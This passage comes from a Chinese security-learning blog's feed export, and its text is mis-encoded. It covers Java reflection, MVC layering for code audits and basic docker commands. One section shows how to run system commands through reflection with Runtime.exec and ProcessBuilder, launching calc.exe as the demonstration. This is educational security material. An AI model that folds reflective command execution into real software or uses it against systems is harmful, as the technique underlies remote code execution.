title="è·å–ç±»çš„æˆå‘˜å˜é‡"></a>è·å–ç±»çš„æˆå‘˜å˜é‡</h4><p>å››ä¸ªæ–¹æ³•å¯¹åº”ä¸Šæ–‡è·å–ç±»æ–¹æ³•çš„å››ä¸ªæ–¹æ³•ã€‚</p><ol><li>getDeclaredFields</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field<span class="token punctuation">[</span><span class="token punctuation">]</span> getDeclaredFields <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>getFields</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field<span class="token punctuation">[</span><span class="token punctuation">]</span> getFields <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>getField</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field getField <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å˜é‡æ²¡æœ‰å‚æ•°ï¼Œå› æ­¤è·å–å˜é‡è‡ªç„¶ä¸éœ€è¦ç¬¬äºŒä¸ªå‚æ•°äº†ï¼Œæ³¨æ„åªèƒ½è·å–publicç±»å‹çš„å˜é‡ã€‚</p><ol start="4"><li>getDeclareField</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field getDeclaredField <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è·å–å¯¹è±¡"><a href="#è·å–å¯¹è±¡" class="headerlink" title="è·å–å¯¹è±¡"></a>è·å–å¯¹è±¡</h4><p>è·å–å¯¹è±¡éƒ½æ˜¯ç”¨newInstance()æ–¹æ³•ï¼Œæ³¨æ„è¦å…ˆè·å¾—ç±»å¯¹è±¡ã€‚</p><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// æ— å‚æ•°</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ— å‚æ•°æ„é€ å¯¹è±¡ç¬¬ä¸€ç§æ–¹æ³•ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters_1 <span class="token operator">=</span> <span class="token punctuation">(</span>newInstanceExample<span class="token punctuation">)</span>cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ— å‚æ•°æ„é€ å¯¹è±¡ç¬¬äºŒç§æ–¹æ³•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters_2 <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// æœ‰å‚æ•°</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æœ‰å‚æ•°æ„é€ å¯¹è±¡ç¬¬ä¸€ç§æ–¹æ³•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters_1 <span class="token operator">=</span> <span class="token punctuation">(</span>newInstanceExample<span class="token punctuation">)</span>cls<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æœ‰å‚æ•°æ„é€ å¯¹è±¡ç¬¬äºŒç§æ–¹æ³•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters_2 <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ„é€ å‡½æ•°æœ‰å‚æ•°ï¼Œé‚£ä¹ˆéœ€è¦è°ƒç”¨getConstructor()å¹¶ä¸”ä¼ å…¥å‚æ•°å¯¹åº”ç±»å‹çš„ç±»å¯¹è±¡ã€‚</p><p>ä½†è¿™ä¸ªæ–¹æ³•æœ‰é™åˆ¶ï¼š</p><ul><li>å¾…å®ä¾‹åŒ–çš„ç±»çš„æ„é€ å‡½æ•°ä¸èƒ½æ˜¯ç§æœ‰çš„</li></ul><p>å¦‚æœæœ‰privateæ„é€ å‡½æ•°åˆ™ä¸èƒ½å®ä¾‹åŒ–ã€‚</p><h4 id="è°ƒç”¨æ–¹æ³•"><a href="#è°ƒç”¨æ–¹æ³•" class="headerlink" title="è°ƒç”¨æ–¹æ³•"></a>è°ƒç”¨æ–¹æ³•</h4><ol><li>ç›´æ¥é€šè¿‡.è°ƒç”¨æ–¹æ³•ï¼Œå› æ­¤è¦åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„åŸºç¡€ä¸Šè·å–ä¸Šã€‚</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</span><span class="token comment" spellcheck="true">// ç›´æ¥è°ƒç”¨</span>no_parameters<span class="token punctuation">.</span><span class="token function">method_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>no_parameters<span class="token punctuation">.</span><span class="token function">method_2</span><span class="token punctuation">(</span><span class="token string">"no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>have_parameters<span class="token punctuation">.</span><span class="token function">method_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>have_parameters<span class="token punctuation">.</span><span class="token function">method_2</span><span class="token punctuation">(</span><span class="token string">"yes!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>invokeè°ƒç”¨ï¼Œå› æ­¤è¦åœ¨è·å¾—ç±»å¯¹è±¡çš„åŸºç¡€ä¸Šè·å–æ–¹æ³•ã€‚</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method_2"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>no_parameters<span class="token punctuation">,</span><span class="token string">"invokeæ–¹æ³•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>String obj <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"method_1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>no_parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><p>åœ¨å­¦ä¼šäº†invokeè°ƒç”¨ï¼Œæ¥ç€æ¥å­¦ä¹ é€šè¿‡åå°„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>Runtimeè¿™ä¸ªç±»æœ‰execå¯ä»¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åŠ è½½Runtimeè¿™ä¸ªç±»ã€‚</p><p>è¯»ä¸€ä¸‹Runtimeæºç ï¼Œå°±ä¼šå‘ç°Runtimeçš„æ„é€ æ–¹æ³•æ˜¯é™æ€çš„ï¼Œå› æ­¤æ— æ³•é€šè¿‡newInstanceå®ä¾‹åŒ–Runtimeï¼Œå¯ä»¥è‡ªå·±å»è¯•ä¸€ä¸‹ï¼Œnew Runtimeä¼šæŠ¥é”™ã€‚è€Œæ­£ç¡®çš„è·å¾—å®ä¾‹åŒ–å¯¹è±¡çš„æ–¹æ³•æ˜¯Runtime.getRuntime()ã€getRuntimeæ–¹æ³•æ˜¯é™æ€çš„ã€‘</p><p>å› æ­¤ï¼Œ<em>ç¬¬ä¸€ç§æ–¹æ³•</em>ï¼š</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>clazz.getMethod(â€œgetRuntimeâ€).invoke(clazz)é€šè¿‡è¿™æ®µä»£ç è°ƒç”¨getRuntimeè·å¾—å¯¹è±¡ï¼Œç„¶åä¼ è¿›invokeé‡Œè¿›è€Œæ‰§è¡Œexecå‡½æ•°ã€‚</strong></p><p>å¦‚æœä¸è°ƒç”¨getRuntimeï¼Œä¹Ÿå¯ä»¥é€šè¿‡getDeclaredConstructorå¹¶ä¸”è®¾ç½®ä½œç”¨åŸŸæ‰§è¡Œï¼Œ<em>ç¬¬äºŒç§æ–¹æ³•</em>ï¼š</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Constructor m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>ProcessBuilderè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ˜¯publicçš„ï¼Œä¸€ä¸ªæ”¯æŒå‚æ•°ä¸ºLIstï¼Œå¦ä¸€ä¸ªæ”¯æŒStringã€‚å¹¶ä¸”å®ƒçš„startæ–¹æ³•èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå› æ­¤ä¹Ÿå¯ä»¥é€šè¿‡ProcessBuilderæ‰§è¡Œå‘½ä»¤ã€‚</p><p><em>ç¬¬ä¸€ç§æ–¹æ³•ï¼š</em></p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>List<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em>ç¬¬äºŒç§æ–¹æ³•ï¼š</em></p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åå°„ </tag>
            
            <tag> Javaå®‰å…¨åŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡åŸºç¡€â€”æ¶æ„</title>
      <link href="/2021/11/12/java-dai-ma-shen-ji-ji-chu-jia-gou/"/>
      <url>/2021/11/12/java-dai-ma-shen-ji-ji-chu-jia-gou/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ¶æ„çš„ç›®çš„å°±æ˜¯åˆ†å±‚ï¼Œä½¿å¾—èŒèƒ½åˆ†ç¦»ã€‚</p></blockquote><h4 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h4><ul><li>M ä»£è¡¨ æ¨¡å‹ï¼ˆModelï¼‰ï¼šç”¨æ¥å–æ•°æ®çš„ï¼Œæˆ‘çš„ç†è§£æ˜¯å……å½“DAOå±‚ä»¥åŠPOJOè¿™äº›ã€‚</li><li>V ä»£è¡¨ è§†å›¾ï¼ˆViewï¼‰ï¼šè´Ÿè´£é¡µé¢å±•ç¤ºã€‚</li><li>C ä»£è¡¨ æ§åˆ¶å™¨ï¼ˆController) ï¼šå¤„ç†é€»è¾‘ï¼Œæ§åˆ¶é¡µé¢è·³è½¬ã€‚</li></ul><p>è¿™æ ·çš„ç›®çš„ä¸»è¦æ˜¯æŠŠViewå’ŒModelåˆ†ç¦»ï¼Œæ”¹æ ·å¼å°±åŠ¨Viewå±‚ï¼ŒControllerè´Ÿè´£é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯ä¸Vå’ŒMä¹‹é—´çš„è”ç³»ã€‚</p><h4 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h4><p>å¯ä»¥çœ‹åˆ°MVCåˆ†ç¦»çš„è¿˜ä¸å¤Ÿç»†åŒ–ï¼Œå› æ­¤SpringMVCå®ç°äº†æŠŠæ§åˆ¶å™¨åˆ†ä¸ºæ§åˆ¶å±‚ä»¥åŠä¸šåŠ¡å±‚ï¼ˆå®é™…ä¸Šå’±ç°åœ¨ç”¨çš„åŸºæœ¬éƒ½æ˜¯SpringMVCä»¥åŠSpringBootè¿™ç§ï¼‰</p><p>SpringMVCï¼šè§†å›¾å±‚è°ƒç”¨æ§åˆ¶å±‚ï¼Œæ§åˆ¶å±‚è°ƒç”¨ä¸šåŠ¡å±‚ï¼Œä¸šåŠ¡å±‚è°ƒç”¨æ•°æ®è®¿é—®å±‚ã€‚</p><p><strong>æ•°æ®è®¿é—®å±‚</strong>ï¼šdata access object(DAO)ï¼ŒDAOå°±æ˜¯å°è£…å®ä½“ç±»åœ¨æ•°æ®åº“ä¸­å¢åˆ æ”¹æŸ¥çš„æ“ä½œã€‚</p><p><strong>ä¸šåŠ¡å±‚</strong>ï¼šç”¨æ¥å†™ä¸šåŠ¡é€»è¾‘çš„<br>å¯¹äºServiceï¼Œå°±æ˜¯ Servlet å’Œ Dao å±‚ä¹‹é—´ç¼“å†²çš„å±‚ã€‚é€šè¿‡è¿™ä¸€å±‚æ¥è¿›è¡Œè§£è€¦ï¼Œä½¿å¾— Dao å±‚å†…çš„å˜åŒ–ä¸ä¼šç›´æ¥å½±å“åˆ° Servlet å±‚ã€‚</p><p><strong>æ§åˆ¶å±‚</strong>ï¼šMVCä¸­çš„Controllerï¼Œç”¨äºå¤„ç†å‰ç«¯é¡µé¢è·³è½¬ï¼Œè°ƒç”¨ä¸šåŠ¡å±‚å®ç°å‰ç«¯é¡µé¢åŠ¨æ€æ•°æ®çš„å±•ç¤ºã€‚</p><p><strong>è§†å›¾å±‚</strong>ï¼šé¡µé¢å±•ç¤ºã€‚</p><h4 id="JAVAEEåˆ†å±‚æ¨¡å‹"><a href="#JAVAEEåˆ†å±‚æ¨¡å‹" class="headerlink" title="JAVAEEåˆ†å±‚æ¨¡å‹"></a>JAVAEEåˆ†å±‚æ¨¡å‹</h4><p>å°±æ˜¯SpringMVCï¼Œé™¤æ­¤ä¹‹å¤–å¤šäº†ä¸€ä¸ªDOã€‚<br><strong>Domain Object(é¢†åŸŸå¯¹è±¡)å±‚</strong></p><p>DOæ˜¯ä»ç°å®ä¸–ç•Œä¸­æŠ½è±¡å‡ºæ¥çš„æœ‰å½¢æˆ–æ— å½¢çš„ä¸šåŠ¡å®ä½“ã€‚</p><p>è¯´ç™½äº†åƒä¸€ä¸ªentityå¯¹åº”ä¸€å¼ è¡¨å«DOã€‚</p><p><strong>DAO(æ•°æ®è®¿é—®å¯¹è±¡)å±‚</strong><br>DAOå®ç°äº†å¯¹æ•°æ®åº“çš„CRUDç­‰å¸¸è§æ“ä½œã€‚</p><p><strong>Service(ä¸šåŠ¡é€»è¾‘)å±‚</strong><br>å®ç°äº†ç³»ç»Ÿæ‰€éœ€è¦çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ã€‚</p><p><strong>Controller(æ§åˆ¶å™¨)å±‚</strong><br>æœ¬å±‚ç”±ä¸€ç³»åˆ—æ§åˆ¶å™¨ç»„æˆï¼Œè¿™äº›æ§åˆ¶å™¨ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶è°ƒç”¨ä¸šåŠ¡é€»è¾‘ç»„ä»¶çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•å»å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œç„¶åæ ¹æ®å¤„ç†ç»“æœå‘ä¸åŒçš„Viewç»„ä»¶è½¬å‘ã€‚</p><p><strong>View(è¡¨ç°å±‚)å±‚</strong><br>é¡µé¢å±•ç¤ºã€‚</p><p>åˆ†å±‚æ¨¡å‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://img-blog.csdnimg.cn/3a9d1d1175bf4645b35363b16a857e90.png#pic_center" alt="å‡ºè‡ªJAVAä»£ç å®‰å…¨å®¡è®¡"></p><h4 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p>1.Javaä»£ç å®‰å…¨å®¡è®¡ï¼ˆå…¥é—¨ç¯‡ï¼‰                å¾ç„±</p><p>2.<a href="https://blog.csdn.net/weixin_45442296/article/details/123111903">https://blog.csdn.net/weixin_45442296/article/details/123111903</a>      JavaRange</p><p>3.<a href="https://blog.csdn.net/qq_43391574/article/details/110944815">https://blog.csdn.net/qq_43391574/article/details/110944815</a>             è½é›¨é’çŸ³è¡—</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå®‰å…¨åŸºç¡€ </tag>
            
            <tag> MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockeråŸºç¡€å‘½ä»¤å­¦ä¹ </title>
      <link href="/2021/11/05/docker-ji-chu-ming-ling-xue-xi/"/>
      <url>/2021/11/05/docker-ji-chu-ming-ling-xue-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="æœç´¢é•œåƒ"><a href="#æœç´¢é•œåƒ" class="headerlink" title="æœç´¢é•œåƒ"></a>æœç´¢é•œåƒ</h4><pre class="line-numbers language-shell"><code class="language-shell">docker search xxxdocker search --filter=STARS=1000       #è¿‡æ»¤ï¼ŒæŒ‡å®šæœç´¢starså¤§äº1000çš„é•œåƒ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>searchæŒ‡ä»¤å¯ä»¥æœç´¢æŒ‡å®šåç§°æˆ–è€…ä»“åº“çš„é•œåƒçš„ä¿¡æ¯ã€‚</p><ol><li>STARS: é•œåƒçš„starsâ€”è¶Šé«˜è¶Šå—æ¬¢è¿ï¼Œ</li><li>OFFICIAL: æ˜¯å¦æ˜¯å®˜æ–¹æä¾›çš„</li><li>AUTOMATED:  æ˜¯ä¸æ˜¯è‡ªåŠ¨åŒ–çš„</li></ol><h4 id="æ‹‰å–é•œåƒ"><a href="#æ‹‰å–é•œåƒ" class="headerlink" title="æ‹‰å–é•œåƒ"></a>æ‹‰å–é•œåƒ</h4><pre class="line-numbers language-shell"><code class="language-shell">docker pull xxxdocker pull xxx:tag       #æŒ‡å®šç‰ˆæœ¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŠŠæŒ‡å®šé•œåƒæ‹‰åˆ°æœ¬åœ°ä»“åº“ï¼Œé»˜è®¤ä¸ºæ‹‰å–æœ€æ–°ç‰ˆæœ¬ã€‚å¯ä»¥é€šè¿‡[é•œåƒ:ç‰ˆæœ¬å·]çš„å½¢å¼æŒ‡å®šå¯¹åº”ç‰ˆæœ¬å·çš„é•œåƒä¸‹è½½ï¼Œä¾‹å¦‚ï¼šdocker pull mysql:5.6.50</p><h4 id="æŸ¥çœ‹é•œåƒ"><a href="#æŸ¥çœ‹é•œåƒ" class="headerlink" title="æŸ¥çœ‹é•œåƒ"></a>æŸ¥çœ‹é•œåƒ</h4><pre class="line-numbers language-shell"><code class="language-shell">docker images || docker images -a  #æŸ¥çœ‹é•œåƒæ‰€æœ‰ä¿¡æ¯docker images -aq                  #æŸ¥çœ‹é•œåƒid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>REPOSITORY: é•œåƒä»“åº“å</li><li>TAG:                é•œåƒæ ‡ç­¾</li><li>IMAGE ID:       é•œåƒid</li><li>CREATED:          é•œåƒåˆ›å»ºæ—¶é—´</li><li>SIZE:                é•œåƒå¤§å°</li></ol><h4 id="ç”Ÿæˆå®¹å™¨"><a href="#ç”Ÿæˆå®¹å™¨" class="headerlink" title="ç”Ÿæˆå®¹å™¨"></a>ç”Ÿæˆå®¹å™¨</h4><pre class="line-numbers language-shell"><code class="language-shell">docker run xxx      #æŒ‡å®šxxxé•œåƒç”Ÿæˆå®¹å™¨docker run -p 8080:8080 -d xxx  #å®¹å™¨å†…éƒ¨8080ç«¯å£æ˜ å°„åˆ°æœ¬åœ°8080ç«¯å£ï¼Œå¹¶å®ˆæŠ¤è¿›ç¨‹åå°è¿è¡Œ<span 